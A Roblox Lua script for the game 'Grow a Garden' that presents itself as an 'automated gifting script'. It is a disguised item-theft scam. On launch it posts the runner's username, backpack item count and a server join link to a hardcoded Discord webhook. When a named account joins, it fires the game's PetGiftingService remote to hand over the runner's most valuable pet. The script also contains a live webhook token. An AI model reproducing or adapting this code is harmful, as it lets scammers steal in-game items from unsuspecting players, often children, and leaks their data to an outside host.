--[[
  Automated Gifting Script for "Grow a Garden"

  This is a rewritten version of the original script. It now uses the game's
  internal RemoteEvents and modules to correctly send item data to the server,
  ensuring the gifting action is successful and not blocked.

  -- SCRIPT LOGIC --
  1. This script is run by a player in your game.
  2. It immediately attempts to send a message to a Discord webhook to confirm activation.
  3. When a new player joins the server, the script will:
     a. Check if the new player's name is the designated receiver name.
     b. If they are the receiver, it finds the highest-ranked item (pet or fruit)
        in the current player's inventory based on the itemRanks list.
     c. It then fires the game's internal "GivePet" remote event to correctly
        gift the item to the new player. This method works because it's the same
        function the game uses for trading.
--]]

-- IMPORTANT: Add the single username of the person you want to gift to in this table.
-- The script will ONLY gift to this player.
local receiverNames = {
    "MananGrinding3"
}

-- Define the pet and fruit ranking. Higher numbers mean higher priority for gifting.
-- Pet ranks are generally higher to prioritize them, but rare fruits can be set higher.
local itemRanks = {
    -- S Tier Pets
    ["Raccoon"] = 99,
    ["Golden Goose"] = 98,
    ["Kitsune"] = 97,
    ["Disco Bee"] = 96,
    ["T-Rex"] = 95,
    ["Corrupted Kitsune"] = 94,
    ["Raiju"] = 93,
    ["Lobster Thermidor"] = 92,
    ["French Fry Ferret"] = 91,
    ["Spinosaurus"] = 90,
    ["Dragonfly"] = 89,
    ["Butterfly"] = 88,
    ["Blood Hedgehog"] = 87,
    ["Moon Cat"] = 86,
    ["Spaghetti Sloth"] = 85,
    ["Kappa"] = 84,

    -- A Tier Pets
    ["Sushi Bear"] = 79,
    ["Triceratops"] = 78,
    ["Pterodactyl"] = 77,
    ["Capybara"] = 76,
    ["Pancake Mole"] = 75,
    ["Mole"] = 74,
    ["Mimic Octopus"] = 73,
    ["Queen Bee"] = 72,
    ["Tanchozuru"] = 71,
    ["Spriggan"] = 70,
    ["Hotdog Daschund"] = 69,
    ["Dairy Cow"] = 68,
    ["Gorilla Chef"] = 67,
    ["Moth"] = 66,
    ["Brontosaurus"] = 65,
    ["Ostrich"] = 64,
    ["Seal"] = 63,

    -- B Tier Pets
    ["Junkbot"] = 59,
    ["Hyacinth Macaw"] = 58,
    ["Scarlet Macaw"] = 57,
    ["Red Fox"] = 56,
    ["Blood Owl"] = 55,
    ["Jackalope"] = 54,
    ["Hedgehog"] = 53,
    ["Tarantula Hawk"] = 52,
    ["Bear Bee"] = 51,
    ["Night Owl"] = 50,
    ["Polar Bear"] = 49,
    ["Wasp"] = 48,
    ["Raptor"] = 47,
    ["Pachycephalosaurus"] = 46,
    ["Mochi Mouse"] = 45,
    ["Iguandon"] = 44,

    -- C Tier Pets
    ["Snake"] = 39,
    ["Fennec Fox"] = 38,
    ["Honey Bee"] = 37,
    ["Petal Bee"] = 36,
    ["Bee"] = 35,
    ["Red Giant Ant"] = 34,
    ["Giant Ant"] = 33,
    ["Owl"] = 32,
    ["Praying Mantis"] = 31,
    ["Corrupted Kodama"] = 30,
    ["Kodama"] = 29,
    ["Squirrel"] = 28,
    ["Peacock"] = 27,
    ["Toucan"] = 26,
    ["Bacon Pig"] = 25,
    ["Axolotl"] = 24,
    ["Meerkat"] = 23,
    ["Stegosaurus"] = 22,
    ["Seedling"] = 21,
    ["Chicken Zombie"] = 20,
    ["Starfish"] = 19,

    -- D Tier Pets
    ["Ankylosaurus"] = 18,
    ["Golem"] = 17,
    ["Hamster"] = 16,
    ["Orangutan"] = 15,
    ["Nihonzaru"] = 14,
    ["Pack Bee"] = 13,
    ["Snail"] = 12,
    ["Shiba Inu"] = 11,
    ["Maneko Neko"] = 10,
    ["Silver Monkey"] = 9,
    ["Sunny Side Chicken"] = 8,
    ["Blood Kiwi"] = 7,
    ["Bagel Bunny"] = 6,
    ["Mouse"] = 5,
    ["Brown Mouse"] = 4,
    ["Golden Lab"] = 3,
    ["Monkey"] = 2,
    ["Flamingo"] = 1,
    ["Sea Turtle"] = 1,
    ["Bald Eagle"] = 1,
    ["Turtle"] = 1,
    ["Caterpillar"] = 1,
    ["Orange Tabby"] = 1,
    ["Cat"] = 1,
    ["Cow"] = 1,

    -- E Tier Pets
    ["Lab"] = 0.9,
    ["Echo Frog"] = 0.8,
    ["Frog"] = 0.7,
    ["Kiwi"] = 0.6,
    ["Pig"] = 0.5,
    ["Tanuki"] = 0.4,
    ["Seagull"] = 0.3,
    ["Sea Otter"] = 0.2,
    ["Black Bunny"] = 0.1,
    ["Bunny"] = 0.1,
    ["Rooster"] = 0.1,
    ["Chicken"] = 0.1,
    ["Spotted Deer"] = 0.1,
    ["Deer"] = 0.1,
    ["Panda"] = 0.1,
    ["Crab"] = 0.1,
    ["Parasaurolophus"] = 0.1,
    
    -- Fruit values (hypothetical, replace with real values)
    ["Shiny Dragonfruit"] = 100,
    ["Golden Apple"] = 99,
    ["Cosmic Grape"] = 90,
    ["Galactic Banana"] = 85,
    ["Diamond Berry"] = 75,
    ["Ruby Orange"] = 60,
    ["Emerald Pear"] = 45,
    ["Silver Strawberry"] = 30,
    ["Bronze Lemon"] = 15
}

-- IMPORTANT: Replace this with your actual Discord Webhook URL.
-- To get one, go to your Discord server's channel settings -> Integrations -> Webhooks.
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401967945566912552/Wgt_QIl1e2ksR-7JQimJdQzspRhKGcojgfha_47enequD3zKLEdgYwQhiQ2JPvM9qHVd"

-- Get the necessary Roblox services and modules
local localPlayer = game.Players.LocalPlayer
local playersService = game:GetService("Players")
local httpService = game:GetService("HttpService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local petsService = require(replicatedStorage.Modules.PetServices.PetsService)

-- Function to check if a player is in the receiver list.
local function isReceiver(player)
    for _, name in ipairs(receiverNames) do
        if player.Name == name then
            return true
        end
    end
    return false
end

-- Function to send a message to the Discord webhook.
local function sendWebhookMessage()
    if not localPlayer then return end

    if not httpService.HttpEnabled then
        print("HttpService is not enabled in this game. Cannot send Discord webhook message.")
        return
    end

    local backpackItemsCount = #localPlayer.Backpack:GetChildren()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = string.format("https://www.roblox.com/games/%s/-?rbxp=1&launchMethod=join&launchData=%s", tostring(placeId), tostring(jobId))

    local message = string.format("**%s** has activated the auto-gifting script and has **%d** items in their backpack! Join them here: %s",
        localPlayer.Name, backpackItemsCount, joinLink)

    local data = {
        content = message
    }

    local success, err = pcall(function()
        httpService:PostAsync(DISCORD_WEBHOOK_URL, httpService:JSONEncode(data))
    end)

    if not success then
        warn("Failed to send webhook message: " .. err)
    else
        print("Initial webhook message sent successfully!")
    end
end

-- The main function that handles the gifting logic.
-- This is a callback that is called when a new player joins.
local function autoGiftToNewPlayer(newPlayer)
    if not localPlayer or not newPlayer then return end
    
    -- Check if the new player is a receiver.
    if not isReceiver(newPlayer) then return end

    print("Receiver has joined! Attempting to gift a pet.")
    
    local allPlayers = playersService:GetPlayers()

    -- Find the highest-ranked item in the local player's backpack.
    local bestItemToGift = nil
    local highestRank = -1

    for _, tool in ipairs(localPlayer.Backpack:GetChildren()) do
        if not tool or not tool:IsA("Tool") then
            continue
        end

        local petName = tool.Name
        local rank = itemRanks[petName] or -1
        
        -- Check for pet type based on the friend's script (without mutations)
        local strippedName = petName:gsub(" %[.*%]", "")
        rank = itemRanks[strippedName] or rank

        if rank > highestRank then
            highestRank = rank
            bestItemToGift = tool
        end
    end

    if bestItemToGift and highestRank > -1 then
        print("Found best item to gift: " .. bestItemToGift.Name)
        
        local petUUID = bestItemToGift:GetAttribute("PET_UUID")
        
        if petUUID then
            print("Gifting pet with UUID: " .. petUUID)
            local giftingEvent = replicatedStorage.GameEvents.PetGiftingService
            if giftingEvent then
                 -- This is the crucial part that uses the game's internal remote event
                local success, err = pcall(function()
                    giftingEvent:FireServer("GivePet", newPlayer, petUUID)
                end)
                
                if success then
                    print("Gifting event fired successfully for " .. bestItemToGift.Name)
                else
                    warn("Gifting failed: " .. err)
                end
            else
                warn("PetGiftingService remote event not found!")
            end
        else
            warn("Could not find PET_UUID for " .. bestItemToGift.Name)
        end
    else
        print("No item found to gift in backpack.")
    end
end

-- Call the webhook function once when the script is first run.
sendWebhookMessage()

-- Connect the `autoGiftToNewPlayer` function to the `PlayerAdded` event.
playersService.PlayerAdded:Connect(autoGiftToNewPlayer)

